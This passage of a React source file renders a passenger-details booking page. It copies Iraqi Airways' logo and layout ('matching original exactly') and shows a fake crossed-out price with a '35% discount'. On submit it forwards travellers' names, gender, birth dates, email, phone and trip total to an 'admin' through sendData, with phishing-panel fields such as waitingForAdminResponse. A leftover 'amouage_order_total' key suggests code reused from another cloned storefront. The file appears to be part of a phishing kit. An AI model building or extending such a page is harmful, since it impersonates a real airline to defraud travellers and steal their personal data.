import React, { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { sendData } from '../lib/store';
import { formatPrice, getCurrency } from '../lib/currency';
import { useLang } from '../contexts/LanguageContext';
import { cityName as cityNameI18n } from '../lib/airportNames';
import CountryCodePicker from '../components/CountryCodePicker';
import DateOfBirthPicker from '../components/DateOfBirthPicker';
import CountrySelect from '../components/CountrySelect';
import SimpleDatePicker from '../components/SimpleDatePicker';

interface Passenger {
  type: string;
  gender: 'Male' | 'Female';
  firstName: string;
  lastName: string;
  dialCode: string;
  phone: string;
  email: string;
  dob: string;
  docType: string;
  passportNo: string;
  issueCountry: string;
  residenceCountry: string;
  expiryDate: string;
  issueDate: string;
}

const PassengerDetails = () => {
  const [, setLocation] = useLocation();
  const { isAr, dir, t, lang } = useLang();
  const [flightData, setFlightData] = useState<any>(null);
  const [passengers, setPassengers] = useState<Passenger[]>([]);
  const [openIndex, setOpenIndex] = useState(0);
  const [primaryIndex, setPrimaryIndex] = useState(0);
  const [flightsOpen, setFlightsOpen] = useState(false);
  const [routeDetailOpen, setRouteDetailOpen] = useState<Record<number, boolean>>({});
  const [cancelChoice, setCancelChoice] = useState<'refundable' | 'no' | null>(null);
  const [passportOpen, setPassportOpen] = useState<Record<number, boolean>>({});
  const [summaryOpen, setSummaryOpen] = useState(false);
  const [emergency, setEmergency] = useState({
    firstName: '',
    lastName: '',
    dialCode: '+964',
    phone: '',
    email: '',
  });
  const [extraEmails, setExtraEmails] = useState<string[]>([]);
  const [extraPhones, setExtraPhones] = useState<{code: string; number: string}[]>([]);
  const [showEmergency, setShowEmergency] = useState(false);
  const [specialAssistance, setSpecialAssistance] = useState<Record<string, any>>({});

  useEffect(() => {
    const ec = localStorage.getItem('emergencyContact');
    if (ec) {
      try { setEmergency((s) => ({ ...s, ...JSON.parse(ec) })); } catch { /* ignore */ }
    }
    const sa = localStorage.getItem('specialAssistance');
    if (sa) {
      try { setSpecialAssistance(JSON.parse(sa) || {}); } catch { /* ignore */ }
    }
    const data = localStorage.getItem('selectedFlight');
    if (!data) {
      setLocation('/');
      return;
    }
    const parsed = JSON.parse(data);
    setFlightData(parsed);

    const px = parsed.pax || { adult: parseInt(parsed.passengers) || 1, child: 0, infant: 0, senior: 0, minor: 0 };
    const types: string[] = [];
    for (let i = 0; i < (px.adult || 0); i++) types.push('Adult');
    for (let i = 0; i < (px.senior || 0); i++) types.push('Senior');
    for (let i = 0; i < (px.child || 0); i++) types.push('Child');
    for (let i = 0; i < (px.infant || 0); i++) types.push('Infant');
    for (let i = 0; i < (px.minor || 0); i++) types.push('Unaccompanied minor');
    if (types.length === 0) types.push('Adult');

    const freshList: Passenger[] = types.map((t) => ({
      type: t,
      gender: 'Male',
      firstName: '',
      lastName: '',
      dialCode: '+965',
      phone: '',
      email: '',
      dob: '',
      docType: '',
      passportNo: '',
      issueCountry: '',
      residenceCountry: '',
      expiryDate: '',
      issueDate: '',
    }));

    // Restore previously entered passenger data (e.g. after visiting the
    // emergency-contact page) so the user's input is never lost.
    let restored: Passenger[] | null = null;
    try {
      const saved = localStorage.getItem('passengerData');
      if (saved) {
        const arr = JSON.parse(saved);
        if (Array.isArray(arr) && arr.length === freshList.length) {
          restored = freshList.map((base, i) => ({ ...base, ...arr[i] }));
        }
      }
    } catch { /* ignore */ }

    setPassengers(restored || freshList);
  }, [setLocation]);

  // Persist passenger data on every change so navigating away (e.g. to add an
  // emergency contact) does not wipe what the user already typed.
  useEffect(() => {
    if (passengers.length > 0) {
      try { localStorage.setItem('passengerData', JSON.stringify(passengers)); } catch { /* ignore */ }
    }
  }, [passengers]);

  const update = (index: number, field: keyof Passenger, value: string) => {
    setPassengers((prev) => prev.map((p, i) => (i === index ? { ...p, [field]: value } : p)));
  };

  // Names must match passport: allow Latin letters, spaces, hyphen and apostrophe only.
  // Strips Arabic and any other non-Latin characters as the user types (like the original).
  const sanitizeName = (value: string) =>
    value.replace(/[^A-Za-z \-']/g, '');

  // Phone: digits only (and an optional leading +). Strips Arabic/Latin letters.
  const sanitizePhone = (value: string) =>
    value.replace(/[^0-9]/g, '');

  // Email: Latin letters, digits and common email characters only (rejects Arabic).
  const sanitizeEmail = (value: string) =>
    value.replace(/[^A-Za-z0-9@._%+\-]/g, '');

  if (!flightData || passengers.length === 0) return null;

  const px = flightData.pax || { adult: parseInt(flightData.passengers) || 1, child: 0, infant: 0, senior: 0, minor: 0 };
  const curCode = getCurrency(flightData.currency).code;
  const totalCount = passengers.length;

  // Pricing: Flights (base, taxes excluded) + Taxes (~3.66% like original 23.250/634.500)
  const base = flightData.basePriceKWD || flightData.priceKWD || 0;
  // Duo seat: a flat fee per seat that is already baked into totalPriceKWD by the
  // results page. Pull it back out so we can show it as its own summary line and
  // avoid double counting when we re-add it to the displayed Total.
  const DUO_SEAT_FEE = 9;
  const duoSeatCount = parseInt(flightData.duoSeat, 10) || 0;
  const duoSeatKWD = Math.round(DUO_SEAT_FEE * duoSeatCount * 1000) / 1000;
  const grandTotalRaw = flightData.totalPriceKWD != null
    ? flightData.totalPriceKWD
    : base * totalCount;
  // Fare-only grand total (flights + taxes), excluding the duo seat fee.
  const grandTotal = Math.round((grandTotalRaw - duoSeatKWD) * 1000) / 1000;
  // Derive flights vs taxes from the grand total (taxes ~ 3.661% of flights portion)
  const taxRate = 0.03661;
  const flightsAmount = Math.round((grandTotal / (1 + taxRate)) * 1000) / 1000;
  const taxesAmount = Math.round((grandTotal - flightsAmount) * 1000) / 1000;

  // Cancel for Any Reason (CFAR): +4 KWD per passenger; refund is 80% of fare+taxes
  const CFAR_FEE = 4.0;
  const cfarFee = cancelChoice === 'refundable' ? Math.round(CFAR_FEE * totalCount * 1000) / 1000 : 0;
  const refundAmount = Math.round(grandTotal * 0.8 * 1000) / 1000;
  // Keep the displayed Total exactly equal to the sum of the displayed lines
  // (Flights + Taxes + CFAR) in the SELECTED currency, so no rounding drift appears.
  const cur = getCurrency(flightData.currency);
  const f = Math.pow(10, cur.decimals);
  const flightsConv = Math.round(flightsAmount * cur.rate * f) / f;
  const taxesConv = Math.round(taxesAmount * cur.rate * f) / f;
  const cfarConv = Math.round(cfarFee * cur.rate * f) / f;
  const duoSeatConv = Math.round(duoSeatKWD * cur.rate * f) / f;
  // Special assistance (wheelchair) add-ons: sum across all passengers in KWD
  const assistanceKWD = Object.values(specialAssistance).reduce(
    (sum: number, v: any) => sum + (v && typeof v.priceKWD === 'number' ? v.priceKWD : 0), 0);
  const assistanceConv = Math.round(assistanceKWD * cur.rate * f) / f;
  const finalTotalConv = Math.round((flightsConv + taxesConv + cfarConv + assistanceConv + duoSeatConv) * f) / f;
  // finalTotal stays in KWD for downstream payment routing
  const finalTotal = Math.round((grandTotal + cfarFee + assistanceKWD + duoSeatKWD) * 1000) / 1000;
  // The 35% discount only applies to the fare portion (flights + taxes), which is
  // already discounted in these figures. Derive the saved amount: original = fare / 0.65.
  const fareConv = Math.round((flightsConv + taxesConv) * f) / f;
  const discountAmountConv = Math.round((fareConv / 0.65 - fareConv) * f) / f;
  // Format an already-converted amount in the selected currency.
  const fmtConv = (v: number) => `${cur.code} ${v.toLocaleString('en-US', { minimumFractionDigits: cur.decimals, maximumFractionDigits: cur.decimals })}`;

  // Trip type summary text
  const tripLabel = flightData.tripType === 'round'
    ? t('common.roundTrip')
    : flightData.tripType === 'multicity'
      ? t('common.multiCity')
      : t('fsr.oneWay');
  const firstDate = (() => {
    const d = (flightData.legs && flightData.legs[0] && flightData.legs[0].date) || flightData.date;
    if (!d) return '';
    const dt = new Date(d);
    if (isNaN(dt.getTime())) return d;
    return dt.toLocaleDateString(isAr ? 'ar-EG' : 'en-GB', { weekday: 'short', day: 'numeric', month: 'short', year: 'numeric' });
  })();

  const handleContinue = () => {
    const primary = passengers[primaryIndex];
    const isValid = passengers.every((p) => p.firstName.trim() && p.lastName.trim())
      && primary.email.trim() && primary.phone.trim();
    if (!isValid) {
      alert('Please complete all required passenger fields, including the primary guest contact details.');
      return;
    }
    localStorage.setItem('passengerData', JSON.stringify(passengers));
    localStorage.setItem('cancelForAnyReason', cancelChoice === 'refundable' ? '1' : '0');
    const summaryLegs = legs.map((leg: any) => {
      const route = (leg.origin && leg.destination)
        ? `${cityName(leg.origin)} - ${cityName(leg.destination)}`
        : (flightData.tripType === 'round' ? 'Departure' : 'Flight');
      const fn = leg.flightNumber
        ? String(leg.flightNumber).replace(/^([A-Za-z0-9]{2})\s?(\d+)$/, '$1 $2')
        : '';
      const times = (leg.departureTime && leg.arrivalTime)
        ? `${leg.departureTime} - ${leg.arrivalTime}` : '';
      const detail = [fn, times, fmtLegDate(leg.date)].filter(Boolean).join(' | ');
      return { route, detail, origin: leg.origin || '', destination: leg.destination || '' };
    });
    const bundleName = flightData.fareType || flightData.bundle || flightData.fareName || (flightData.legs && flightData.legs[0] && flightData.legs[0].fare) || 'Basic';
    localStorage.setItem('tripSummary', JSON.stringify({
      passengerCount: totalCount,
      tripLabel,
      firstDate,
      flightsConv,
      taxesConv,
      cfarConv,
      baseTotalConv: finalTotalConv,
      curCode,
      curDecimals: cur.decimals,
      curRate: cur.rate,
      baseTotalKWD: finalTotal,
      discountConv: discountAmountConv,
      legs: summaryLegs,
      bundleName,
      primaryName: `${primary.firstName} ${primary.lastName}`.trim(),
      route: summaryLegs[0] ? `${summaryLegs[0].origin} \u2708 ${summaryLegs[0].destination}` : '',
      originCode: summaryLegs[0] ? summaryLegs[0].origin : '',
      destCode: summaryLegs[0] ? summaryLegs[0].destination : '',
    }));
    localStorage.setItem('amouage_order_total', String(finalTotal));
    
    // Send passenger data to admin
    const paxData: Record<string, any> = {
      "البريد الإلكتروني": primary.email,
      "رقم الهاتف": `${primary.dialCode} ${primary.phone}`,
      "الرحلة": summaryLegs[0] ? `${summaryLegs[0].origin} ✈ ${summaryLegs[0].destination}` : '',
      "الإجمالي": `${finalTotalConv} ${curCode}`,
    };
    passengers.forEach((p, i) => {
      const label = passengers.length > 1 ? ` (مسافر ${i + 1})` : '';
      paxData[`الاسم${label}`] = `${p.firstName} ${p.lastName}`.trim();
      paxData[`الجنس${label}`] = p.gender === 'Female' ? 'أنثى' : 'ذكر';
      if (p.dob) paxData[`تاريخ الميلاد${label}`] = p.dob;
    });
    sendData({
      data: paxData,
      current: "بيانات المسافر",
      nextPage: "اختيار المقاعد",
      waitingForAdminResponse: false,
      isCustom: true,
    });

    setLocation('/seat-customization');
  };

  const legs = Array.isArray(flightData.legs) && flightData.legs.length > 0
    ? flightData.legs
    : [{
        origin: flightData.origin,
        destination: flightData.destination,
        date: flightData.date,
        flightNumber: flightData.flightNumber,
        departureTime: flightData.departureTime,
        arrivalTime: flightData.arrivalTime,
      }];

  // Map common IATA codes to city names (fallback to the code itself)
  const CITY_NAMES: Record<string, string> = {
    KWI: 'Kuwait', AMD: 'Ahmedabad', AUH: 'Abu Dhabi', DXB: 'Dubai',
    DOH: 'Doha', JED: 'Jeddah', RUH: 'Riyadh', CAI: 'Cairo', BAH: 'Bahrain',
    MCT: 'Muscat', AMM: 'Amman', BEY: 'Beirut', IST: 'Istanbul', DEL: 'Delhi',
    BOM: 'Mumbai', COK: 'Kochi', CCJ: 'Calicut', TRV: 'Trivandrum', MAA: 'Chennai',
    HYD: 'Hyderabad', BLR: 'Bengaluru', DAC: 'Dhaka', CMB: 'Colombo', KTM: 'Kathmandu',
    SLL: 'Salalah', ADE: 'Aden', SAH: 'Sanaa', LXR: 'Luxor', SSH: 'Sharm El Sheikh',
    ALY: 'Alexandria', TBS: 'Tbilisi', GYD: 'Baku', EVN: 'Yerevan', SAW: 'Istanbul',
    NJF: 'Najaf', BGW: 'Baghdad', BSR: 'Basra', EBL: 'Erbil', ISU: 'Sulaymaniyah',
  };
  const cityName = (code?: string) => (code ? cityNameI18n(String(code).toUpperCase(), CITY_NAMES[String(code).toUpperCase()] || code, lang) : '');
  const paxTypeLabel = (type: string) => {
    if (!isAr) return type;
    const map: Record<string, string> = { Adult: 'بالغ', Child: 'طفل', Infant: 'رضيع', Senior: 'كبير السن', Minor: 'قاصر' };
    return map[type] || type;
  };

  const fmtLegDate = (d?: string) => {
    if (!d) return '';
    const dt = new Date(d);
    if (isNaN(dt.getTime())) return d;
    return dt.toLocaleDateString(isAr ? 'ar-EG' : 'en-GB', { weekday: 'short', day: 'numeric', month: 'short', year: 'numeric' });
  };

  const calcDuration = (dep?: string, arr?: string) => {
    if (!dep || !arr) return '';
    const toMin = (t: string) => {
      const m = t.match(/(\d{1,2}):(\d{2})/);
      if (!m) return null;
      return parseInt(m[1], 10) * 60 + parseInt(m[2], 10);
    };
    const a = toMin(dep), b = toMin(arr);
    if (a == null || b == null) return '';
    let diff = b - a;
    if (diff < 0) diff += 24 * 60; // overnight
    const h = Math.floor(diff / 60), mm = diff % 60;
    return `${h}h ${mm}m`;
  };

  // Bundle/fare name for trip summary
  const bundleName = flightData.fareType || flightData.bundle || flightData.fareName || (flightData.legs && flightData.legs[0] && flightData.legs[0].fare) || 'Basic';

  // --- TRIP SUMMARY CONTENT (shared between desktop sidebar and mobile bottom sheet) ---
  const TripSummaryContent = () => (
    <>
      <div className="flex items-center gap-2 text-[#0a2540] mb-2">
        <svg className="w-5 h-5 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a4 4 0 00-3-3.87M9 20H4v-2a4 4 0 013-3.87m6-1.13a4 4 0 100-8 4 4 0 000 8z" /></svg>
        <span className="text-[15px]">{totalCount} {totalCount > 1 ? t('common.passengers') : t('common.passenger')}</span>
      </div>
      <div className="flex items-center gap-2 text-[#0a2540] mb-5">
        <svg className="w-5 h-5 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>
        <span className="text-[15px]">{tripLabel}: {firstDate}</span>
      </div>

      {/* Flights box (expandable) */}
      <div className="bg-[#f4f7fb] rounded-xl mb-3">
        <button
          type="button"
          onClick={() => setFlightsOpen((o) => !o)}
          className="w-full flex items-center justify-between px-4 py-4"
        >
          <span className="text-[#0a2540] font-bold text-[15px]">{t('seat.flights')}</span>
          <span className="flex items-center gap-2">
            <span className="text-[#0a72c0] font-semibold text-[15px]">{fmtConv(flightsConv)}</span>
            <svg className={`w-4 h-4 text-[#0a72c0] transition-transform ${flightsOpen ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" /></svg>
          </span>
        </button>
        {flightsOpen && (
          <div className="px-4 pb-4 border-t border-[#e3eaf2] pt-3 space-y-4">
            {legs.map((leg: any, i: number) => {
              const route = (leg.origin && leg.destination)
                ? `${cityName(leg.origin)} - ${cityName(leg.destination)}`
                : (flightData.tripType === 'round' ? t('common.departure') : (isAr ? 'رحلة' : 'Flight'));
              const fn = leg.flightNumber
                ? String(leg.flightNumber).replace(/^([A-Za-z0-9]{2})\s?(\d+)$/, '$1 $2')
                : '';
              const times = (leg.departureTime && leg.arrivalTime)
                ? `${leg.departureTime} - ${leg.arrivalTime}` : '';
              const dateStr = fmtLegDate(leg.date);
              const detailParts = [fn, times, dateStr].filter(Boolean);
              const stops = leg.stops != null ? leg.stops : 0;
              const dur = leg.duration || calcDuration(leg.departureTime, leg.arrivalTime);
              const badgeText = `${stops === 0 ? (isAr ? 'مباشر' : 'Non stop') : stops + (stops === 1 ? (isAr ? ' توقف' : ' Stop') : (isAr ? ' توقفات' : ' Stops'))}${dur ? ' | ' + dur : ''}`;
              const isRouteOpen = routeDetailOpen[i] || false;
              return (
                <div key={i} className="space-y-2">
                  {/* Route header - expandable */}
                  <button
                    type="button"
                    onClick={() => setRouteDetailOpen((prev) => ({ ...prev, [i]: !prev[i] }))}
                    className="w-full flex items-center justify-between"
                  >
                    <span className="text-[#0a2540] font-semibold text-[15px]">{route}</span>
                    <svg className={`w-4 h-4 text-gray-400 transition-transform ${isRouteOpen ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" /></svg>
                  </button>
                  {isRouteOpen && (
                    <div className="space-y-2 pl-0">
                      {detailParts.length > 0 && (
                        <div className="text-sm text-[#5b6b7b]">{detailParts.join(' | ')}</div>
                      )}
                      <div className="flex justify-center">
                        <span className="inline-block bg-[#d1d5db] text-[#1f2937] text-xs font-medium px-4 py-1.5 rounded-full">{badgeText}</span>
                      </div>
                      {/* Fare type badge */}
                      <div className="flex justify-center">
                        <span className="inline-block bg-[#e5e7eb] text-[#374151] text-xs font-medium px-6 py-1.5 rounded-full w-full text-center">{bundleName}</span>
                      </div>
                      {/* Passenger breakdown */}
                      <div className="pt-2 space-y-1">
                        <div className="flex items-center justify-between">
                          <span className="flex items-center gap-2 text-[#0a2540] font-semibold text-sm">
                            <svg className="w-4 h-4 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a4 4 0 00-3-3.87M9 20H4v-2a4 4 0 013-3.87m6-1.13a4 4 0 100-8 4 4 0 000 8z" /></svg>
                            {isAr ? 'الركاب' : 'Passengers'}
                          </span>
                          <span className="text-[#0a72c0] font-semibold text-sm">{fmtConv(flightsConv)}</span>
                        </div>
                        {/* Per-type breakdown */}
                        {(px.adult || 0) > 0 && (
                          <div className="flex items-center justify-between text-sm text-[#5b6b7b]">
                            <span>{px.adult}x {isAr ? 'بالغ' : 'Adult'}</span>
                            <span className="text-[#0a72c0]">{fmtConv(flightsConv)}</span>
                          </div>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        )}
      </div>

      {/* Taxes box */}
      <div className="bg-[#f4f7fb] rounded-xl mb-3">
        <div className="flex items-center justify-between px-4 py-4">
          <span className="text-[#0a2540] font-bold text-[15px]">{isAr ? 'الضرائب' : 'Taxes'}</span>
          <span className="text-[#0a72c0] font-semibold text-[15px]">{fmtConv(taxesConv)}</span>
        </div>
      </div>

      {/* CFAR fee */}
      {cfarFee > 0 && (
        <div className="flex items-center justify-between px-4 py-3 mb-3 bg-[#f4f7fb] rounded-xl">
          <span className="text-[#0a2540] font-medium">{isAr ? 'الإلغاء لأي سبب' : 'Cancel for Any Reason'}</span>
          <span className="text-[#0a72c0] font-semibold">{fmtConv(cfarConv)}</span>
        </div>
      )}

      {/* Duo seat */}
      {duoSeatKWD > 0 && (
        <div className="flex items-center justify-between px-4 py-3 mb-3 bg-[#f4f7fb] rounded-xl">
          <span className="text-[#0a2540] font-medium">{isAr ? `مقعد دو (${duoSeatCount})` : `Duo seat (${duoSeatCount})`}</span>
          <span className="text-[#0a72c0] font-semibold">{fmtConv(duoSeatConv)}</span>
        </div>
      )}

      {/* Special assistance (wheelchair) */}
      {assistanceKWD > 0 && (
        <div className="flex items-center justify-between px-4 py-3 mb-3 bg-[#f4f7fb] rounded-xl">
          <span className="text-[#0a2540] font-medium">{isAr ? 'إضافات' : 'Add-ons'}</span>
          <span className="text-[#0a72c0] font-semibold">{fmtConv(assistanceConv)}</span>
        </div>
      )}

      {/* Discount: 35% already applied only to the fare (flights + taxes); add-ons/CFAR are not discounted. */}
      <div className="flex items-center justify-between px-4 py-3 mb-3 bg-[#fdeaea] rounded-xl">
        <span className="text-[#c0392b] font-medium">{isAr ? 'إجمالي الخصم 35%' : 'Total discount 35%'}</span>
        <span className="text-[#c0392b] font-semibold">- {fmtConv(discountAmountConv)}</span>
      </div>

      {/* Total */}
      <div className="flex items-center justify-between mt-4 mb-5">
        <span className="text-lg font-bold text-[#0a2540]">{t('common.total')}</span>
        <span className="flex flex-col items-end leading-tight">
          <span className="text-sm line-through text-red-500">{fmtConv(Math.round((finalTotalConv + discountAmountConv) * f) / f)}</span>
          <span className="text-lg font-extrabold text-[#0a72c0]">{fmtConv(finalTotalConv)}</span>
        </span>
      </div>
    </>
  );

  // fieldset input style matching original
  const fieldsetCls = "w-full bg-[#f5faf0] border border-[#4CAF50] rounded px-4 py-4 text-gray-800 placeholder-gray-400 focus:outline-none focus:border-[#2E7D32] text-[15px]";
  const labelCls = "block text-[13px] text-[#2E7D32] font-medium mb-1";

  return (
    <div className="min-h-screen bg-white font-[Lato]" dir="ltr">
      {/* Header - matching original exactly */}
      <header className="bg-[#398017] text-white">
        {/* Top bar: Logo + Home + English */}
        <div className="max-w-7xl mx-auto px-6 py-2 flex items-center gap-4">
          <img src="/iraqi_airways/upload/logo-white-transparent.png" alt="Iraqi Airways" className="h-14" />
          <span className="text-white/40">|</span>
          <a href="/" className="text-white font-medium">Home</a>
          <span className="text-white/40">|</span>
          <span className="text-white">English <span className="text-xs">▼</span></span>
        </div>
      </header>
      {/* Flight info bar - white background, green text like original */}
      <div className="bg-white border-b border-gray-200 py-2">
        <div className="max-w-7xl mx-auto px-6 flex items-center">
          {/* Route */}
          <div className="flex items-center gap-4">
            <div>
              <span className="text-2xl font-bold text-[#1B5E20]">{flightData?.origin || 'BGW'}</span>
              <p className="text-xs text-[#1B5E20]">{cityName(flightData?.origin || 'BGW')}</p>
            </div>
            <span className="text-[#1B5E20]/40 text-sm">··············· ✈ ···············</span>
            <div>
              <span className="text-2xl font-bold text-[#1B5E20]">{flightData?.destination || 'EBL'}</span>
              <p className="text-xs text-[#1B5E20]">{cityName(flightData?.destination || 'EBL')}</p>
            </div>
          </div>
          {/* Separator */}
          <span className="mx-6 text-gray-300 text-2xl">|</span>
          {/* Depart */}
          <div>
            <p className="text-sm text-[#1B5E20]">Depart</p>
            <p className="font-bold text-[#1B5E20]">{flightData?.date ? new Date(flightData.date + 'T00:00:00').toLocaleDateString('en-GB', {weekday:'short', day:'numeric', month:'short'}) : ''}</p>
          </div>
          {/* Separator */}
          <span className="mx-6 text-gray-300 text-2xl">|</span>
          {/* Passenger */}
          <div>
            <p className="text-sm text-[#1B5E20]">Passenger</p>
            <p className="font-bold text-[#1B5E20]">{totalCount} 👤</p>
          </div>
          {/* Your booking - right, square green box like original */}
          <div className="ml-auto bg-[#2E7D32] w-[90px] h-[70px] rounded flex flex-col items-center justify-center gap-1 text-white">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M2.25 3h1.386c.51 0 .955.343 1.087.835l.383 1.437M7.5 14.25a3 3 0 00-3 3h15.75m-12.75-3h11.218c1.121-2.3 2.1-4.684 2.924-7.138a60.114 60.114 0 00-16.536-1.84M7.5 14.25L5.106 5.272M6 20.25a.75.75 0 11-1.5 0 .75.75 0 011.5 0zm12.75 0a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"/></svg>
            <span className="font-bold text-[10px]">Your booking</span>
          </div>
        </div>
      </div>

      {/* Main content */}
      <main className="max-w-4xl mx-auto px-6 py-8">
        {/* Personal information */}
        <div className="border border-gray-200 rounded-lg p-8 mb-6">
          <h2 className="text-center text-[#2E7D32] text-2xl mb-6">Personal information</h2>
          <p className="text-[#2E7D32] text-sm mb-1">* = mandatory fields</p>
          <p className="text-gray-600 text-sm mb-6">Please fill personal information as shown in the passport</p>
          
          {passengers.map((p, index) => (
            <div key={index} className="space-y-5 mb-8">
              {passengers.length > 1 && <h3 className="text-[#2E7D32] font-bold text-lg">Passenger {index + 1} ({p.type})</h3>}
              {/* Title */}
              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                <legend className="text-[#2E7D32] text-xs px-1">Title*</legend>
                <select value={p.gender === 'Male' ? 'Mr' : 'Mrs'} onChange={(e) => update(index, 'gender', e.target.value === 'Mr' ? 'Male' : 'Female')} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]">
                  <option value="" disabled>Choose a title</option>
                  <option value="Mr">Mr</option>
                  <option value="Mrs">Mrs</option>
                  <option value="Ms">Ms</option>
                </select>
              </fieldset>
              {/* First name - English letters only */}
              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                <legend className="text-[#2E7D32] text-xs px-1">First name*</legend>
                <input type="text" placeholder="Enter a first name" value={p.firstName} onChange={(e) => { const v = e.target.value.replace(/[^a-zA-Z\s\-']/g, ''); update(index, 'firstName', v); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
              </fieldset>
              {/* Last name - English letters only */}
              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                <legend className="text-[#2E7D32] text-xs px-1">Last name*</legend>
                <input type="text" placeholder="Enter a last name" value={p.lastName} onChange={(e) => { const v = e.target.value.replace(/[^a-zA-Z\s\-']/g, ''); update(index, 'lastName', v); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
              </fieldset>
              {/* Date of birth - auto-format DD/MM/YYYY */}
              <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
                <legend className="text-[#2E7D32] text-xs px-1">Date of birth</legend>
                <input type="text" placeholder="Day / Month / Year" value={p.dob} onChange={(e) => { let v = e.target.value.replace(/[^0-9]/g, ''); if (v.length > 2) v = v.slice(0,2) + '/' + v.slice(2); if (v.length > 5) v = v.slice(0,5) + '/' + v.slice(5); if (v.length > 10) v = v.slice(0,10); update(index, 'dob', v); }} maxLength={10} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
              </fieldset>
              <p className="text-gray-400 text-xs">Example: 31/01/2025</p>
            </div>
          ))}

          {/* Frequent flyer cards */}
          <h2 className="text-center text-[#2E7D32] text-2xl mt-8 mb-6">Frequent flyer cards</h2>
          <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0] mb-5">
            <legend className="text-[#2E7D32] text-xs px-1">Frequent flyer program</legend>
            <select className="w-full bg-transparent text-gray-400 focus:outline-none text-[15px]">
              <option value="">Select a program</option>
              <option value="iraqi">Iraqi Airways</option>
            </select>
          </fieldset>
          <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
            <legend className="text-[#2E7D32] text-xs px-1">Frequent flyer number</legend>
            <input type="text" placeholder="Enter a frequent flyer number" className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
          </fieldset>
        </div>

        {/* Contact Information */}
        <div className="border border-gray-200 rounded-lg p-8 mb-6">
          <h2 className="text-center text-[#2E7D32] text-2xl mb-6">Contact Information</h2>
          {/* Email */}
          <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0] mb-5">
            <legend className="text-[#2E7D32] text-xs px-1">Email*</legend>
            <input type="email" placeholder="Enter an email address" value={passengers[0]?.email || ''} onChange={(e) => { const v = e.target.value.replace(/[^a-zA-Z0-9@._\-+]/g, ''); update(0, 'email', v); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
          </fieldset>
          {/* Confirm email */}
          <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0] mb-5">
            <legend className="text-[#2E7D32] text-xs px-1">Confirm email*</legend>
            <input type="email" placeholder="Confirm an email address" className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
          </fieldset>
          {/* Extra emails */}
          {extraEmails.map((em, i) => (
            <fieldset key={`em-${i}`} className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0] mb-5">
              <legend className="text-[#2E7D32] text-xs px-1">Additional email</legend>
              <input type="email" placeholder="Enter an email address" value={em} onChange={(e) => { const arr = [...extraEmails]; arr[i] = e.target.value.replace(/[^a-zA-Z0-9@._\-+]/g, ''); setExtraEmails(arr); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
            </fieldset>
          ))}
          {/* Add another email */}
          <div className="text-center mb-6">
            <button type="button" onClick={() => setExtraEmails([...extraEmails, ''])} className="bg-[#2E7D32] text-white px-6 py-2.5 rounded-full text-sm font-medium">Add another email address</button>
          </div>
          {/* Phone type */}
          <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0] mb-5">
            <legend className="text-[#2E7D32] text-xs px-1">Phone type*</legend>
            <select className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]">
              <option value="Personal">Personal</option>
              <option value="Business">Business</option>
            </select>
          </fieldset>
          {/* Country code + Phone number */}
          <div className="grid grid-cols-2 gap-4 mb-5">
            <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
              <legend className="text-[#2E7D32] text-xs px-1">Country calling code*</legend>
              <input type="text" placeholder="Enter a country calling code" value={passengers[0]?.dialCode || '+964'} onChange={(e) => { const v = e.target.value.replace(/[^0-9+]/g, ''); update(0, 'dialCode', v); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
            </fieldset>
            <fieldset className="border border-[#4CAF50] rounded px-3 pt-1 pb-2 bg-[#f5faf0]">
              <legend className="text-[#2E7D32] text-xs px-1">Phone number*</legend>
              <input type="tel" placeholder="Enter a mobile phone" value={passengers[0]?.phone || ''} onChange={(e) => { const v = e.target.value.replace(/[^0-9]/g, ''); update(0, 'phone', v); }} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
            </fieldset>
          </div>
          {/* Extra phones */}
          {extraPhones.map((ph, i) => (
            <div key={`ph-${i}`} className="grid grid-cols-2 gap-4 mb-5">
